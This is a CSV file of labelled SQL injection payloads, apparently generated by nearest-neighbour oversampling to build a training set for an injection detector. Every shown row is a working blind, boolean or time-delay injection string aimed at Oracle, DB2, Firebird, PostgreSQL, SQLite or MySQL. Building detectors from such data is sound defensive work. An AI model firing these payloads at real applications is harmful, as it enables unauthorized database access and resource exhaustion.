id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000139,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000067,0.2783639574858241
SMOTE_000140,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,0.2855464666883289
SMOTE_000141,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,0.5649129451807868
SMOTE_000142,attack,boolean,"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",nearest_attack_euclidean,R000073,0.7177195733695133
SMOTE_000143,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,0.755834107378938
SMOTE_000144,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.0005550020429624771
SMOTE_000145,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,0.2701526156932565
SMOTE_000146,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000148,0.22677489677982968
SMOTE_000147,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000114,0.22134756232368988
SMOTE_000148,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.279802285495906
SMOTE_000149,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,1.3245452718538449
SMOTE_000150,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000123,0.26338005085166666
SMOTE_000151,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.12584808917024587
SMOTE_000152,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.08155118407636985
SMOTE_000153,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000105,1.0089726665518657
SMOTE_000154,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000060,1.8061084932749225
SMOTE_000155,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000129,0.9014492591982621
SMOTE_000156,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.21643493537525035
SMOTE_000157,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.596099766896558
SMOTE_000158,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,1.0082126417994277
SMOTE_000159,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000103,1.0094374329050533
SMOTE_000160,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000089,0.08560995398348095
SMOTE_000161,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,1.055134002955291
SMOTE_000162,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,0.7979610905600213
SMOTE_000163,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,0.23260082227221668
SMOTE_000164,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,0.6687295652596515
SMOTE_000165,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000144,1.156850852085562
SMOTE_000166,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000044,1.1826035467755769
SMOTE_000167,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.46112900890751124
SMOTE_000168,attack,boolean,-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,nearest_attack_euclidean,R000151,0.2454321324430804
SMOTE_000169,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,0.1283800000615673
SMOTE_000170,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000096,1.0244214408254195
SMOTE_000171,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.6902277834809766
SMOTE_000172,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000135,1.0365518622479446
SMOTE_000173,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.7958414481578137
SMOTE_000174,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000094,0.012675746651728562
SMOTE_000175,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,1.4184585520385724
SMOTE_000176,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,2.761457387778275
SMOTE_000177,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000081,0.38029298279315193
SMOTE_000178,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,0.4381822242009552
SMOTE_000179,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.9738686888973374
SMOTE_000180,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.08196134323264403
SMOTE_000181,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,0.10884778020974546
SMOTE_000182,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.5280891019241691
SMOTE_000183,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.26389662308378115
SMOTE_000184,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000060,0.9431285665050062
SMOTE_000185,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,4.130038700424304
SMOTE_000186,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,1.009019302937327
SMOTE_000187,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000023,0.903693671077947
SMOTE_000188,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000029,0.21183213898586953
SMOTE_000189,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,0.9695844399004604
SMOTE_000190,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000031,0.2535483575692728
SMOTE_000191,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,0.9257248356132537
SMOTE_000192,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,nearest_attack_euclidean,R000139,0.08341262803643426
SMOTE_000193,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000140,1.7906460675097196
SMOTE_000194,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.2891447951131485
SMOTE_000195,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000122,1.8603395779723195
SMOTE_000196,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,0.7932963188621206
SMOTE_000197,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,0.13509267059038105
SMOTE_000198,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000027,1.0959009668557598
SMOTE_000199,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.31325088211211694
SMOTE_000200,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.9498141140109733
SMOTE_000201,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.11682412651328998
SMOTE_000202,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000056,1.4494694011441367
SMOTE_000203,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.08092863929477505
SMOTE_000204,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.48830567107737227
SMOTE_000205,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,0.4089572190651538
SMOTE_000206,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,0.8006006469259713
SMOTE_000207,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,1.631077842257488
SMOTE_000208,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000122,0.8306670139158496
SMOTE_000209,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,1.5560271297173673
SMOTE_000210,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,2.2575538628283836
SMOTE_000211,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000022,2.2476802110935163
SMOTE_000212,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000099,0.8068855465883086
SMOTE_000213,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000153,2.757809587642761
SMOTE_000214,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,0.067433051529772
SMOTE_000215,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000081,1.712663864240857
SMOTE_000216,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000128,0.053100777068717894
SMOTE_000217,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000077,1.5191074021312632
SMOTE_000218,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,0.30137080500978153
SMOTE_000219,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000047,0.23203604721112153
SMOTE_000220,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000156,1.3164178510722715
SMOTE_000221,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.138874529347032
SMOTE_000222,attack,boolean,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,nearest_attack_euclidean,R000065,0.3201308423991612
SMOTE_000223,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000070,1.1654354812416585
SMOTE_000224,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,0.09510258183898895
SMOTE_000225,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,1.4970386592060008
SMOTE_000226,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,0.6737024867163663
SMOTE_000227,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000109,0.4507500524965891
SMOTE_000228,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,0.5451782231363227
SMOTE_000229,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000117,1.035009573769349
SMOTE_000230,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000091,0.43282387971085434
SMOTE_000231,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000128,0.3350739807970454
SMOTE_000232,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,0.42716023978351103
SMOTE_000233,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.5076813576650572
SMOTE_000234,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,0.9252743783666114
SMOTE_000235,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,2.326081216302282
SMOTE_000236,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,0.26544424441007414
SMOTE_000237,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000075,0.6292272322558745
SMOTE_000238,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,0.7851433170552321
SMOTE_000239,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,0.6945068554370829
SMOTE_000240,attack,boolean,"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R000101,2.1166538450914136
SMOTE_000241,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000085,1.1026464077607245
SMOTE_000242,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,0.3346918048874965
SMOTE_000243,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000129,0.15559820400195978
SMOTE_000244,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,0.0036442645772121903
SMOTE_000245,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.07191823340806916
SMOTE_000246,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.13866115817063446
SMOTE_000247,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.11158588656607082
SMOTE_000248,attack,boolean,"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",nearest_attack_euclidean,R000073,1.6299246551241693
SMOTE_000249,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000054,2.7479590631979485
SMOTE_000250,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,1.0592957039382707
SMOTE_000251,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000035,0.6393662625649268
SMOTE_000252,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.97242315779516
SMOTE_000253,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000093,0.2948884355038026
SMOTE_000254,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000004,1.409334961094058
SMOTE_000255,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000100,0.1478518817055905
SMOTE_000256,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,1.6361710990655725
SMOTE_000257,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000055,0.09081168780560193
SMOTE_000258,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,0.6778328093178567
SMOTE_000259,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.33805909134054807
SMOTE_000260,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,0.30894175083768305
SMOTE_000261,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000137,0.2563485228047484
SMOTE_000262,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000008,0.0085418517792716
SMOTE_000263,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,1.389407694856482
SMOTE_000264,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000041,0.6032195342408219
SMOTE_000265,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,1.380227247821074
SMOTE_000266,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000035,0.04981958883854575
SMOTE_000267,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.02574889627739952
SMOTE_000268,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,1.3297571041659115
SMOTE_000269,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000055,0.1696675986644873
SMOTE_000270,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,1.3577463324418497
SMOTE_000271,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000138,0.8814318516976939
SMOTE_000272,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,0.5981426212510808
SMOTE_000273,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,1.495819866010171
